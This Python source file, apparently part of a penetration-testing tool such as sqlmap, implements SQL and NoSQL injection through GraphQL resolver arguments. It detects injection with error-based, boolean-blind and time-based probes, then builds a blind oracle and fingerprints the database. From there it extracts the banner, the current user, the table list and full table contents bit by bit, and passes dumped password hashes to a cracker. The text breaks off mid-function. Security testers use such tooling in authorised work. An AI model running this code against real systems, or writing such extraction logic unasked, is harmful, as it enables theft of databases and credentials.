def _renderInputPath(inputTypeName, pathParts, value, strategy, _seen=None):
    """Render the body of an input-object literal for `inputTypeName`, placing `value` at the field path
    `pathParts` (one or more levels deep) and filling required sibling fields with synthesized defaults.
    Descends recursively into nested input objects - e.g. path ['filter','credentials','username'] yields
    `filter:{credentials:{username:VALUE}}` alongside any required siblings at each level. Depth/cycle
    bounded via `_seen`."""
    _seen = _seen or set()
    fields = _inputFields.get(inputTypeName, [])
    target = pathParts[0] if pathParts else None
    parts = []
    for fldName, fldType, fldDefault in fields:
        if fldName == target:
            if len(pathParts) == 1:                 # leaf: the injected value goes here
                parts.append(_renderArg(fldName, value, _classifyArg(fldType) or strategy or "string"))
            else:                                    # descend into the nested input object
                innerName = _leafName(_unwrapType(fldType))
                if innerName and innerName not in _seen:
                    parts.append("%s:{%s}" % (fldName, _renderInputPath(innerName, pathParts[1:], value, strategy, _seen | {innerName})))
                else:
                    parts.append("%s:{}" % fldName)  # cycle / unknown inner type -> best-effort empty
        else:
            sibling = _renderSibling(fldName, fldType, fldDefault)
            if sibling is not None:                 # omit optional input-object fields with no default
                parts.append(sibling)
    return ", ".join(parts)


def _leafKind(chain):
    # kind of the innermost NAMED type in an unwrapped type chain (SCALAR / ENUM / INPUT_OBJECT / ...)
    for kind, name in reversed(chain):
        if name:
            return kind
    return None


def _nativeSentinel(argType, depth=0, seen=None):
    # Synthesize a REQUIRED argument's value in NATIVE GraphQL syntax by type kind. A one-size sentinel
    # (`0`/`"x"`) is invalid for Boolean/Enum/List/input-object and makes the whole query fail to parse,
    # so resolver execution (and thus injection) is never reached. A list wrapper takes an empty list
    # (valid for a NON_NULL list); a bool is `false`; an int/float is `0`; an enum is a bare enum
    # identifier (first schema value). A required INPUT_OBJECT is built RECURSIVELY - its required inner
    # fields are populated (schema defaults verbatim, else synthesized) so a nested-required schema like
    # SearchInput!{ filter: FilterInput!{ term: String! } } yields a VALID benign query instead of a
    # bare `{}` the server rejects. Recursion is bounded by depth and a visited-type set (cycle safety).
    chain = _unwrapType(argType)
    if any(kind == "LIST" for kind, _ in chain):
        return "[]"
    named = _leafName(chain)
    kind = _leafKind(chain)
    if kind == "ENUM":
        values = _enumValues.get(named) or []
        return values[0] if values else '"x"'      # bare enum identifier, not a quoted string
    if kind == "INPUT_OBJECT":
        seen = seen or set()
        if depth >= 5 or named in seen:             # bound depth / break recursive input-type cycles
            return "{}"
        seen = seen | {named}
        parts = []
        for fName, fType, fDefault in _inputFields.get(named, []):
            if fDefault is not None:
                parts.append("%s:%s" % (fName, fDefault))          # schema default is a literal - verbatim
            elif (fType or {}).get("kind") == "NON_NULL":          # populate ONLY required inner fields
                parts.append("%s:%s" % (fName, _nativeSentinel(fType, depth + 1, seen)))
        return "{%s}" % ", ".join(parts)
    strategy = SCALAR_STRATEGY.get(named)
    if strategy == "numeric":
        return "0"
    if named == "Boolean":
        return "false"
    return '"x"'


def _renderSibling(name, argType, default):
    # Render a sibling argument we are NOT injecting into. Returns None to OMIT the argument (the caller
    # drops it). An OPTIONAL argument with no schema default is OMITTED rather than filled with a bogus
    # sentinel - filling e.g. an optional Boolean/Enum/List with `"x"` made the whole query invalid and
    # caused widespread false negatives (resolver execution never reached). A schema-provided
    # defaultValue is ALREADY a serialized GraphQL literal per the introspection spec (bool `true`, enum
    # `ADMIN` unquoted, list `[1, 2]`, object `{a: 1}`, null, number, or a quoted string) and is emitted
    # VERBATIM (never re-quoted). A REQUIRED (NON_NULL) argument with no default is synthesized in native
    # syntax by kind (see _nativeSentinel).
    if default is not None:
        return "%s:%s" % (name, default)
    if (argType or {}).get("kind") != "NON_NULL":
        return None                                 # optional + no default -> omit it
    return "%s:%s" % (name, _nativeSentinel(argType))


# --- Detection --------------------------------------------------------------

def _detectError(slot, endpoint):
    # Error-based detection with a NEGATIVE CONTROL. A GraphQL endpoint can already return a DBMS
    # exception for reasons unrelated to our probe (e.g. a required argument we rendered incorrectly),
    # so a raw "signature present in the injected response" test declares injectable regardless of
    # influence. Require the signature to be ABSENT from a benign baseline, appear only AFTER the
    # injected value, and REPRODUCE before accepting it.
    benign = _buildQuery(slot, "1")
    basePage = _gqlSend(endpoint, benign)[0] if benign else None
    baseErr = _errorText(basePage) or ""

    def _appearsOnlyAfterInjection(query, matcher):
        # matcher(text) -> re.Match or None; True only if it hits the injected response, is absent
        # from the benign baseline, and reproduces on a second injected request
        err = _errorText(_gqlSend(endpoint, query)[0])
        if not err or not matcher(err) or matcher(baseErr):
            return None
        err2 = _errorText(_gqlSend(endpoint, query)[0])
        return matcher(err) if (err2 and matcher(err2)) else None

    for payload in _SQL_ERROR_PAYLOADS:
        query = _buildQuery(slot, payload)
        if not query:
            continue
        for pattern in ERROR_PARSING_REGEXES:
            m = _appearsOnlyAfterInjection(query, lambda t, p=pattern: re.search(p, t))
            if m:
                detail = m.group("result") if "result" in m.groupdict() else _errorText(_gqlSend(endpoint, query)[0])[:200]
                return "error-based", detail, payload

    for payload in (_NOSQL_NE, _NOSQL_IN):
        query = _buildQuery(slot, payload)
        if not query:
            continue
        m = _appearsOnlyAfterInjection(query, lambda t: re.search(NOSQL_ERROR_REGEX, t))
        if m:
            return "nosql-error-based", (_errorText(_gqlSend(endpoint, query)[0]) or "")[:200], payload

    return None, None, None


def _detectBoolean(slot, endpoint):
    # Boolean-based detection: compare the resolved data between true and false
    # payloads. Numeric GraphQL literals (Int/Float) cannot carry SQL payloads.

    if slot.strategy == "numeric":
        return None, None, None

    trueQuery = _buildQuery(slot, _SQL_BOOLEAN_TRUE)
    falseQuery = _buildQuery(slot, _SQL_BOOLEAN_FALSE)

    if not trueQuery or not falseQuery:
        return None, None, None

    truePage, _ = _gqlSend(endpoint, trueQuery)
    truePage2, _ = _gqlSend(endpoint, trueQuery)
    falsePage, _ = _gqlSend(endpoint, falseQuery)
    falsePage2, _ = _gqlSend(endpoint, falseQuery)

    # a None page is a transport failure / blocked (WAF/5xx) sample - never an oracle observation.
    # Rejecting it here stops the classic FP where two failed true requests are byte-identical and
    # "differ" from a succeeding false request.
    if any(p is None for p in (truePage, truePage2, falsePage, falsePage2)):
        return None, None, None

    # a GraphQL resolver ERROR yields the same `data:null` as a genuine false predicate, so a false
    # payload that merely trips a stable resolver error would look like a boolean oracle. Reject any
    # pair where either side carries `errors` - that case belongs to _detectError, not boolean.
    if any(_hasErrors(p) for p in (truePage, truePage2, falsePage, falsePage2)):
        return None, None, None

    trueVal = _slotValue(truePage)
    trueVal2 = _slotValue(truePage2)
    falseVal = _slotValue(falsePage)
    falseVal2 = _slotValue(falsePage2)

    # BOTH sides must independently reproduce (not just the true side)
    if _ratio(falseVal, falseVal2) < (1.0 - _MIN_RATIO_DIFF):
        return None, None, None

    # Require the true response to be REPRODUCIBLE (trueVal ~= trueVal2) and to diverge
    # from the false response. A single true-vs-false compare turns page jitter into a
    # false positive; a reproducibility guard (like the other non-SQL engines' _boolean)
    # rejects it, since a jittery page also fails to reproduce against itself.
    if _ratio(trueVal, trueVal2) >= (1.0 - _MIN_RATIO_DIFF) and _ratio(trueVal, falseVal) < (1.0 - _MIN_RATIO_DIFF):
        return "boolean-based blind (string)", truePage, _SQL_BOOLEAN_TRUE

    return None, None, None


def _detectTime(slot, endpoint):
    # Time-based detection: send a per-dialect conditional sleep and measure the
    # elapsed time against a baseline. Returns (oracleType, threshold, dbms).

    if slot.strategy == "numeric":
        return None, None, None, None

    baseQuery = _buildQuery(slot, "x")
    if not baseQuery:
        return None, None, None, None

    def elapsed(query):
        # return (seconds, usable): a blocked/5xx/transport-failed response is NOT a usable timing
        # sample, so a slow WAF block cannot establish a time-based finding here (the same
        # blocked/transport rule the extraction oracle applies).
        start = time.time()
        page, code = _gqlSend(endpoint, query)
        dt = time.time() - start
        return dt, (page is not None and not blockedStatus(code))

    baseDt, baseUsable = elapsed(baseQuery)
    if not baseUsable:
        return None, None, None, None
    delay = conf.timeSec
    cutoff = baseDt + delay * 0.5

    def slow(query):                                # a CONFIRMED slow, USABLE response
        dt, usable = elapsed(query)
        return usable and dt > cutoff

    for dbms, dialect in DIALECTS.items():
        if not dialect.delay:
            continue
        sleepValue = "%s' OR %s-- " % (SENTINEL, dialect.delay("1=1", delay))
        sleepQuery = _buildQuery(slot, sleepValue)
        if not sleepQuery or not slow(sleepQuery):
            continue

        # Confirm before attributing: the delay must REPRODUCE (usable+slow) and a false-condition
        # control must stay fast. A single sample turns jitter/a uniformly-slow endpoint into a false
        # positive and can pin the wrong dialect; requiring the delay to track the condition rules both
        # out. A blocked slow response is rejected by `slow()` (usable gate).
        controlQuery = _buildQuery(slot, "%s' OR %s-- " % (SENTINEL, dialect.delay("1=2", delay)))
        controlDt, controlUsable = elapsed(controlQuery) if controlQuery else (0, True)
        if slow(sleepQuery) and (controlQuery is None or (controlUsable and controlDt <= cutoff)):
            return "time-based blind", cutoff, dbms, sleepValue

    return None, None, None, None


# --- Boolean / time oracle (universal blind-SQLi primitive) -----------------

def _makeOracle(slot, endpoint, dbmsHint=None, threshold=None):
    """Establish a truth(sqlCondition) -> bool primitive on `slot`. For a content
    oracle the condition is injected as `<sentinel>' OR (<cond>)-- ` and the resolved
    field is compared to its always-true template; for a timing oracle the condition
    is wrapped in the dialect's conditional sleep. Returns (truth, truthBatch) where
    truthBatch(conditions) -> [bool] evaluates many conditions in one aliased request
    (None when the back-end rejects batching). Returns (None, None) when no usable
    contrast exists on this slot."""

    def _payload(condition):
        return "%s' OR (%s)-- " % (SENTINEL, condition)

    if threshold is not None and dbmsHint and DIALECTS[dbmsHint].delay:
        # Timing oracle: a per-document sleep fires only when `condition` holds. Batching would serialise
        # the sleeps and inflate every request, so it is not offered here. A single measurement against a
        # fixed threshold turns jitter into wrong bits over a long dump, so classify with repeated
        # samples: a clear fast/slow reading decides immediately; a reading near the threshold is
        # RE-SAMPLED, and persistent ambiguity aborts the value (InconclusiveError) rather than guessing.
        delay = DIALECTS[dbmsHint].delay

        def _elapsed(condition):
            query = _buildQuery(slot, "%s' OR %s-- " % (SENTINEL, delay(condition, conf.timeSec)))
            if not query:
                return None
            start = time.time()
            page, code = _gqlSend(endpoint, query)
            if page is None or blockedStatus(code):     # transport failure/block is UNKNOWN, not "fast"
                return None
            return time.time() - start

        def truth(condition):
            margin = max(0.5, conf.timeSec * 0.25)      # ambiguity band around the threshold
            for _attempt in range(3):
                dt = _elapsed(condition)
                if dt is None:
                    continue                            # re-sample a failed/blocked reading
                if dt > threshold + margin:
                    return True
                if dt < threshold - margin:
                    return False
                # NEAR the threshold: a lone confirming sample deciding True/False would guess on an
                # ambiguous pair, so loop and RE-SAMPLE; only a clear reading (above) decides, else the
                # retries exhaust and the value aborts (InconclusiveError). A missing/low confirmation
                # is NOT "False".
            raise InconclusiveError()

        return truth, None

    # Content oracle: calibrate BOTH the always-true and never-true models on the SAME extraction shape
    # the bits use, and require a clear split between them.
    trueVal = _slotValue(_gqlSend(endpoint, _buildQuery(slot, _payload("1=1")))[0])
    falseVal = _slotValue(_gqlSend(endpoint, _buildQuery(slot, _payload("1=2")))[0])
    if _ratio(trueVal, falseVal) > UPPER_RATIO_BOUND:
        return None, None

    def truth(condition):
        # Tri-state: classify each bit against BOTH models with a margin, RE-SEND on an ambiguous read,
        # and ABORT the value (InconclusiveError) on persistent ambiguity - never let a transport
        # failure or a near-tie silently become a False bit that corrupts the extracted value.
        query = _buildQuery(slot, _payload(condition))
        if not query:
            raise InconclusiveError()

        def send():
            page, code = _gqlSend(endpoint, query)
            if page is None or blockedStatus(code) or _hasErrors(page):
                return None                 # a resolver ERROR is UNKNOWN, not a false bit
            return _slotValue(page)

        return resolveBit(send(), trueVal, falseVal, send)

    def truthBatch(conditions):
        query, aliases = _buildBatch(slot, [_payload(_) for _ in conditions])
        if not query:
            raise InconclusiveError()
        page, code = _gqlSend(endpoint, query)
        if page is None or blockedStatus(code):
            raise InconclusiveError()       # a FAILED batch must NOT decay into a list of False bits
        doc = _parseJSON(page) or {}
        data = doc.get("data")
        if not isinstance(data, dict):
            raise InconclusiveError()
        # A batch is trustworthy ONLY when every error is attributable to a specific alias via a
        # non-empty path. A PATHLESS / global error (request-level, auth, middleware, unpathed resolver
        # exception) affects the WHOLE batch, so it must invalidate every bit - not be ignored while the
        # aliases (which may still be null) get classified as clean false observations.
        for e in (doc.get("errors") or []):
            path = e.get("path") if isinstance(e, dict) else None
            if not (isinstance(path, list) and path):
                raise InconclusiveError()   # pathless/global error -> the entire batch is UNKNOWN
        out = []
        for alias in aliases:
            if alias not in data or _aliasErrored(page, alias):   # absent or errored alias is UNKNOWN
                raise InconclusiveError()
            d = _decide(json.dumps(data.get(alias), sort_keys=True, default=str), trueVal, falseVal)
            if d is _Decision.INCONCLUSIVE:
                raise InconclusiveError()   # an ambiguous bit in a batch -> abort the value, don't guess
            out.append(d is _Decision.TRUE)
        return out

    # Sanity: the oracle must answer a known truth/falsehood correctly
    try:
        if not (truth("1=1") and not truth("1=2")):
            return None, None
    except InconclusiveError:
        return None, None

    # NEVER batch a MUTATION: _buildBatch aliases the field once per condition, so a single batched
    # request would EXECUTE the write resolver many times. Aliased batching is a read-side speed-up
    # only; a mutation extracts one condition per request (sequential), unless a verified dry-run/
    # rollback argument makes repeated execution non-persisting (not assumed here).
    if slot.operation == "mutation":
        return truth, None

    return truth, truthBatch


def _fingerprint(truth):
    # Identify the back-end DBMS by probing each dialect's signature predicate. An inconclusive probe
    # is not a match (and not a crash) - skip that dialect rather than abort the whole fingerprint.
    for dbms, dialect in DIALECTS.items():
        try:
            if truth(dialect.fingerprint):
                return dbms
        except InconclusiveError:
            continue
    return None


# --- Blind inference --------------------------------------------------------

def _safeChr(codepoint):
    try:
        return _unichr(codepoint)
    except (ValueError, OverflowError):
        return "?"


def _inferChar(truth, dialect, expr, pos):
    """Recover one character's codepoint by bisection: the printable-ASCII range first
    (fast, ~log2(95) probes), widening to the full Unicode range only when the codepoint
    proves to be above it - so non-ASCII/UTF-8 data is recovered rather than silently
    mangled into a wrong printable char. Control bytes below CHAR_MIN surface as '?'.
    (MySQL's ASCII() yields the leading byte of a multibyte char, not its codepoint - a
    documented limitation; the codepoint-returning dialects recover exactly.)"""

    ordExpr = dialect.ordinal(expr, pos)
    if not truth("%s>=%d" % (ordExpr, CHAR_MIN)):
        return "?"
    hi = UNICODE_MAX if truth("%s>%d" % (ordExpr, CHAR_MAX)) else CHAR_MAX
    low, high = CHAR_MIN, hi
    while low < high:
        mid = (low + high + 1) // 2
        if truth("%s>=%d" % (ordExpr, mid)):
            low = mid
        else:
            high = mid - 1
    return _safeChr(low)


def _inferExpr(truth, dialect, expr, maxLen=MAX_LENGTH):
    # Recover the string value of SQL expression `expr` one character at a time:
    # binary-search the length, then each character via _inferChar (printable-fast,
    # widening to full Unicode for non-ASCII). A persistently-inconclusive bit aborts the
    # value (returns None) rather than being coerced to a wrong length/char.
    lengthExpr = dialect.length(expr)

    try:
        if not truth("%s>0" % lengthExpr):
            return "" if truth("%s=0" % lengthExpr) else None

        length, probe = 1, 2
        while probe <= maxLen and truth("%s>=%d" % (lengthExpr, probe)):
            length, probe = probe, probe * 2
        low, high = length, min(probe, maxLen + 1)
        while low + 1 < high:
            mid = (low + high) // 2
            if truth("%s>=%d" % (lengthExpr, mid)):
                low = mid
            else:
                high = mid
        length = low

        if length >= maxLen:
            logger.warning("value length hit the %d-char cap; the recovered value may be truncated" % maxLen)

        value = ""
        for pos in xrange(1, length + 1):
            value += _inferChar(truth, dialect, expr, pos)
    except InconclusiveError:
        logger.warning("GraphQL blind extraction aborted for a value (oracle inconclusive after retries)")
        return None
    return value


def _inferExprBatched(truthBatch, truth, dialect, expr, maxLen=MAX_LENGTH):
    # Same recovery as _inferExpr, but every probe is independent and resolved in
    # parallel via aliased batching: the length is read from monotone >=N predicates
    # and each character from its 7 independent bit predicates (ASCII & 2**b) plus one
    # ">CHAR_MAX" flag. An L-character value costs ceil(8*L / BATCH_SIZE) requests. A
    # flagged (non-ASCII) position is then recovered exactly via `truth` bisection
    # (the 7 bits only carry the low byte), so non-ASCII data is not mangled.
    lengthExpr = dialect.length(expr)

    try:
        length = 0
        for chunk in _chunks(list(xrange(1, maxLen + 1)), BATCH_SIZE):
            results = truthBatch(["%s>=%d" % (lengthExpr, _) for _ in chunk])
            hits = [n for n, ok in zip(chunk, results) if ok]
            if hits:
                length = max(length, max(hits))
            if not all(results):       # monotone predicate: no longer length can be true beyond here
                break
        if length == 0:
            return ""

        conditions, index = [], []
        for pos in xrange(1, length + 1):
            for bit in xrange(7):
                conditions.append("(%s & %d)>0" % (dialect.ordinal(expr, pos), 1 << bit))
                index.append((pos, bit))
            conditions.append("%s>%d" % (dialect.ordinal(expr, pos), CHAR_MAX))
            index.append((pos, "hi"))

        codes, wide = {}, set()
        flat = []
        for chunk in _chunks(conditions, BATCH_SIZE):
            flat.extend(truthBatch(chunk))
        for (pos, bit), ok in zip(index, flat):
            if bit == "hi":
                if ok:
                    wide.add(pos)
            elif ok:
                codes[pos] = codes.get(pos, 0) | (1 << bit)

        value = ""
        for pos in xrange(1, length + 1):
            if pos in wide:
                value += _inferChar(truth, dialect, expr, pos)     # non-ASCII: exact recovery
            else:
                code = codes.get(pos, 0)
                value += _unichr(code) if CHAR_MIN <= code <= CHAR_MAX else "?"
    except InconclusiveError:
        # a failed/ambiguous batch must abort the value, not silently yield a run of false bits
        logger.warning("GraphQL batched extraction aborted for a value (oracle inconclusive)")
        return None
    return value


def _inferrer(truth, truthBatch, dialect):
    # Pick batched inference when the back-end honours aliased batching (verified
    # with a known true/false pair), else fall back to sequential bisection
    if truthBatch:
        try:
            if truthBatch(["1=1", "1=2"]) == [True, False]:
                logger.info("using aliased query batching to accelerate blind extraction")
                return lambda expr, maxLen=MAX_LENGTH: _inferExprBatched(truthBatch, truth, dialect, expr, maxLen)
        except InconclusiveError:
            pass                # batching calibration was ambiguous -> use sequential bisection
    return lambda expr, maxLen=MAX_LENGTH: _inferExpr(truth, dialect, expr, maxLen)


def _inferCount(infer, expr, label):
    # Recover a COUNT(*). Distinguish an INCONCLUSIVE oracle (`infer` returns None) from a genuine
    # numeric answer: an inconclusive count must NOT collapse to 0 (which would present an unavailable
    # catalog/table as a confirmed-empty one). Returns an int, or None when the count is unknown.
    raw = infer("(SELECT COUNT(*) %s)" % expr)
    if raw is None:
        logger.warning("%s count is inconclusive (oracle unavailable); result may be incomplete" % label)
        return None
    raw = raw.strip()
    if raw.isdigit():
        return int(raw)
    # a NON-NUMERIC / corrupted count is UNKNOWN, not a confirmed empty catalog/table -> None (partial),
    # never 0 (which would present an unavailable result as "no rows")
    logger.warning("%s count came back non-numeric (%r); treating as inconclusive, not empty" % (label, raw[:32]))
    return None


def _catList(infer, dialect, col, fromClause, label="catalog"):
    # Enumerate a catalog name list (tables or a table's columns) one entry at a time by
    # ordinal position, so a GROUP_CONCAT/STRING_AGG the back-end would silently truncate
    # (e.g. MySQL group_concat_max_len=1024) can't drop names.
    count = _inferCount(infer, fromClause, label)
    if count is None:
        return None                                 # UNKNOWN (not empty) - caller must not report "0 names"

    names, missing = [], 0
    for offset in xrange(min(count, DUMP_MAX_ROWS)):
        name = infer("(SELECT %s %s %s)" % (col, fromClause, dialect.paginate(col, offset)))
        if name is None:
            missing += 1                            # inconclusive name (NOT a genuine empty) - count it
        elif name:
            names.append(name)

    if missing:
        logger.warning("%s: %d of %d name(s) were inconclusive and omitted" % (label, missing, min(count, DUMP_MAX_ROWS)))
    if count > DUMP_MAX_ROWS:
        logger.warning("catalog lists %d names; enumerating the first %d (DUMP_MAX_ROWS cap)" % (count, DUMP_MAX_ROWS))

    return names


def _dumpTable(infer, dialect, table):
    # Enumerate a table's columns, then recover its rows ONE AT A TIME by ordinal
    # position. A whole-table GROUP_CONCAT/STRING_AGG would be silently truncated by
    # the back-end (e.g. MySQL group_concat_max_len=1024), dropping rows; per-row
    # extraction has no such cap.
    columns = _catList(infer, dialect, dialect.columnCol, dialect.columnFrom(table), label="table '%s' columns" % table)
    if not columns:                                 # None (inconclusive) or [] (genuinely no columns)
        return None

    count = _inferCount(infer, "FROM %s" % dialect.fromIdent(table), "table '%s'" % table)
    if count is None:
        return None                                 # UNKNOWN row count - do NOT present as an empty table

    rows, missing = [], 0
    for offset in xrange(min(count, DUMP_MAX_ROWS)):
        raw = infer(dialect.row(columns, table, offset), DUMP_MAX_LENGTH)
        if raw is None:
            missing += 1                            # inconclusive row (NOT skipped-as-empty) - count it
            continue
        cells = raw.split(COL_SEP)
        rows.append((cells + [""] * len(columns))[:len(columns)])

    if missing:
        logger.warning("table '%s': %d of %d row(s) were inconclusive and omitted (result is partial)" % (table, missing, min(count, DUMP_MAX_ROWS)))
    if count > DUMP_MAX_ROWS:
        logger.warning("table '%s' has %d rows; dumping the first %d (DUMP_MAX_ROWS cap)" % (table, count, DUMP_MAX_ROWS))

    return columns, rows


# --- Dump -------------------------------------------------------------------

def _dumpInband(endpoint, slot, templatePage):
    # Check whether the always-true response carries materially more data than
    # the original (in-band data exposure)
    origQuery = _buildQuery(slot, "x")
    if not origQuery:
        return None
    origPage, _ = _gqlSend(endpoint, origQuery)
    if len(templatePage or "") < len(origPage or "") * 1.25:
        return None
    return _parseRows(templatePage, slot)


def _parseRows(page, slot):
    # Parse a GraphQL JSON `data` tree into (columns, rows)
    doc = _parseJSON(page)
    if not isinstance(doc, dict):
        return None
    data = doc.get("data")
    if not isinstance(data, dict):
        return None
    for v in data.values():
        if v is None:
            return None
        if isinstance(v, list):
            columns = []
            for item in v:
                if isinstance(item, dict):
                    for k in item:
                        if k not in columns:
                            columns.append(k)
            rows = []
            for item in v:
                if isinstance(item, dict):
                    rows.append([_cell(item.get(c)) for c in columns])
            return (columns, rows) if rows else None
        if isinstance(v, dict):
            columns = sorted(v.keys())
            rows = [[_cell(v.get(c)) for c in columns]]
            return (columns, rows)
    return None


def _grid(columns, rows):
    # Render a simple ASCII table
    if not columns or not rows:
        return "(empty)"
    widths = []
    for i, c in enumerate(columns):
        w = len("%s" % (c,))
        for r in rows:
            w = max(w, len("%s" % (r[i] if i < len(r) else "",)))
        widths.append(w)
    sep = "+-" + "-+-".join("-" * w for w in widths) + "-+"
    header = "| " + " | ".join(("%s" % (c,)).ljust(w) for c, w in zip(columns, widths)) + " |"
    lines = [sep, header, sep]
    for row in rows:
        lines.append("| " + " | ".join(("%s" % (row[i] if i < len(row) else "",)).ljust(w)
                                        for i, w in enumerate(widths)) + " |")
    lines.append(sep)
    return "\n".join(lines)


def _renderTypeStr(chain):
    # Render a GraphQL type chain: String!, [User], [String!]!, [[Int]!]! ... `chain` is outermost->
    # innermost (see _unwrapType), so wrap the named type INSIDE-OUT (reversed) - composing each
    # wrapper around the accumulated string. The old code overwrote a single shared suffix, so a
    # nested `[String!]!` collapsed to the malformed `[String!` (list-close lost).
    out = _leafName(chain) or ""
    for kind, _ in reversed(chain):
        if kind == "NON_NULL":
            out += "!"
        elif kind == "LIST":
            out = "[" + out + "]"
    return out


def _dumpSchema(schema, endpoint):
    # Dump the schema as readable tables: types and their fields/arguments
    if not schema:
        return

    types = schema.get("types") or []
    queryName = (schema.get("queryType") or {}).get("name")
    mutationName = (schema.get("mutationType") or {}).get("name")

    rows = []
    for t in types:
        if not isinstance(t, dict):
            continue
        kind = t.get("kind", "")
        name = t.get("name", "")
        if kind not in ("OBJECT", "INPUT_OBJECT"):
            continue
        rootTag = ""
        if name == queryName:
            rootTag = " [Query]"
        elif name == mutationName:
            rootTag = " [Mutation]"
        fields = t.get("fields") or t.get("inputFields") or []
        if not fields:
            rows.append([kind, name + rootTag, "", "", "", ""])
        for f in fields:
            fName = f.get("name", "")
            typeStr = _renderTypeStr(_unwrapType(f.get("type", {})))
            for a in (f.get("args") or []):
                aType = _renderTypeStr(_unwrapType(a.get("type", {})))
                strategy = _classifyArg(a.get("type", {})) or ""
                rows.append([kind, name + rootTag, fName, typeStr, a["name"], aType, strategy])
            if not (f.get("args") or []):
                rows.append([kind, name + rootTag, fName, typeStr, "", "", ""])

    if rows:
        conf.dumper.singleString("GraphQL schema (%s):\n%s" % (endpoint,
            _grid(["Kind", "Type", "Field", "Return", "Argument", "ArgType", "Strategy"], rows)))


# --- Orchestration ----------------------------------------------------------

def _testSlot(slot, endpoint):
    """Confirm an injection on `slot` and report it. Returns (oracleType, oracle, detail)
    where `oracle` is (truth, truthBatch, dbmsHint) for a usable blind-SQLi primitive (None for an
    error-only / non-differential point) and `oracleType` is None when nothing is confirmed."""

    kind = oracleType = detail = templatePage = dbmsHint = threshold = winningPayload = None
    isMutation = slot.operation == "mutation"

    def _boolean():
        return ("boolean",) + _detectBoolean(slot, endpoint)     # (kind, oracleType, templatePage, winPayload)

    def _error():
        et, dt, wp = _detectError(slot, endpoint)
        return ("error", et, None, wp, dt)

    def _time():
        ot, th, dh, wp = _detectTime(slot, endpoint)
        return ("time", ot, None, wp, th, dh)

    # For a MUTATION, run the error-based and (false-condition) probes BEFORE the always-true boolean
    # pair, so a write resolver is not driven with a satisfied predicate any earlier than necessary; for
    # a query, boolean content inference is the most reliable oracle and is preferred first.
    order = ("error", "boolean", "time") if isMutation else ("boolean", "error", "time")
    for step in order:
        if step == "boolean":
            _k, oracleType, templatePage, winningPayload = _boolean()
            if oracleType:
                kind = "boolean"
                logger.info("boolean-based oracle confirmed (%s)" % oracleType)
                break
        elif step == "error":
            _k, errorType, _tp, winningPayload, detail = _error()
            if errorType:
                kind, oracleType = "error", errorType
                logger.info("error-based oracle confirmed")
                break
        else:
            _k, oracleType, _tp, winningPayload, threshold, dbmsHint = _time()
            if oracleType:
                kind = "time"
                logger.info("time-based oracle confirmed (back-end '%s', threshold %.1fs)" % (dbmsHint, threshold))
                break

    if not kind:
        logger.info("no oracle confirmed for this slot")
        return None, None, None

    # GraphQL is the TRANSPORT, not the vulnerability class. The oracle here is a blind SQL (or, for
    # a NoSQL error signature, NoSQL) injection primitive in a resolver - report it as such, with
    # GraphQL as the transport and the resolver argument as the location (the reviewer's core point:
    # "Type: GraphQL injection" is wrong; it is SQL/NoSQL injection reached VIA GraphQL).
    vulnClass = "NoSQL injection" if (oracleType or "").startswith("nosql") else "SQL injection"
    location = "%s.%s(%s:)" % (slot.parentType, slot.fieldName, slot.targetArg)
    logger.info("%s is vulnerable to %s via GraphQL (%s-based)" % (location, vulnClass, kind))
    title = "%s via GraphQL (%s-based)" % (vulnClass, kind)
    # report the EXACT query that established THIS finding (the winning boolean/error/time/nosql
    # payload), never a representative SQL-boolean payload for a time- or error-based hit - the shown
    # reproducer must actually reproduce the reported issue
    payload = _buildQuery(slot, winningPayload) or winningPayload
    impactLine = ("    Impact: mutation (%s)\n" % _mutationImpact(slot.fieldName)) if isMutation else ""
    report = ("---\nParameter: %s (%s)\n    Type: %s\n    Title: %s\n    Transport: GraphQL\n%s"
              "    Payload: %s\n---") % (location, slot.strategy, vulnClass, title, impactLine, _escapeGraphQLString(payload))
    conf.dumper.singleString(report)
    if conf.beep:
        beep()

    # In-band exposure: the always-true payload reflecting extra records directly
    if kind == "boolean" and templatePage:
        rows = _dumpInband(endpoint, slot, templatePage)
        if rows:
            columns, dataRows = rows
            logger.info("in-band data exposure: %d record(s)" % len(dataRows))
            conf.dumper.singleString("GraphQL in-band data for %s.%s(%s:):\n%s" % (
                slot.parentType, slot.fieldName, slot.targetArg, _grid(columns, dataRows)))

    if kind in ("boolean", "time"):
        truth, truthBatch = _makeOracle(slot, endpoint, dbmsHint, threshold)
        if truth:
            return oracleType, (truth, truthBatch, dbmsHint), detail

    return oracleType, None, detail


def _enumerate(oracle):
    """Drive the blind-SQLi oracle to fingerprint the back-end and enumerate it:
    banner, current user/database, the table list, and a full blind dump of every
    user table. All of this is recovered without knowing any SQL identifier up front."""

    truth, truthBatch, dbmsHint = oracle

    dbms = dbmsHint or _fingerprint(truth)
    if not dbms:
        logger.warning("could not fingerprint the back-end DBMS through the GraphQL oracle")
        return

    dialect = DIALECTS[dbms]
    logger.info("back-end DBMS: '%s'" % dbms)
    conf.dumper.singleString("GraphQL back-end DBMS: %s" % dbms)

    infer = _inferrer(truth, truthBatch, dialect)

    for label, expr in (("banner", dialect.banner),
                        ("current user", dialect.currentUser),
                        ("current database", dialect.currentDb)):
        if not expr:
            continue
        value = infer(expr)
        if value:
            logger.info("%s: '%s'" % (label, value))
            conf.dumper.singleString("GraphQL %s: %s" % (label, value))

    tables = _catList(infer, dialect, dialect.tableCol, dialect.tableFrom)
    if not tables:
        logger.warning("no tables recovered through the oracle")
        return

    logger.info("fetching tables")
    conf.dumper.singleString("GraphQL database tables [%d]:\n%s" % (
        len(tables), _grid(["table"], [[_] for _ in tables])))

    for table in tables:
        parsed = _dumpTable(infer, dialect, table)
        if not parsed:
            continue
        columns, rows = parsed
        logger.info("fetched %d entr%s from table '%s'" % (len(rows), "y" if len(rows) == 1 else "ies", table))

        # Populate kb.data.dumpedTable and feed it through the standard
        # password-hash analysis (hash-recognition + optional dictionary-crack)
        # BEFORE displaying the dump, so that cracked passwords appear inline
        # next to their hashes (matching the regular SQL table-dump workflow)
        if len(rows) > 0 and not conf.disableHashing:
            oldDumpedTable = getattr(kb.data, "dumpedTable", None)
            try:
                from lib.utils.hash import attackDumpedTable
                kb.data.dumpedTable = {"__infos__": {"count": len(rows)}}
                for ci, col in enumerate(columns):
                    kb.data.dumpedTable[col] = {"values": [row[ci] if ci < len(row) else "" for row in rows]}
                attackDumpedTable()
                # Re-read the rows: attackDumpedTable() may have appended
                # cracked passwords in-place (e.g. "hash (password)")
                for ci, col in enumerate(columns):
                    if col in kb.data.dumpedTable:
                        vals = kb.data.dumpedTable[col].get("values", [])
                        for ri in xrange(min(len(rows), len(vals))):
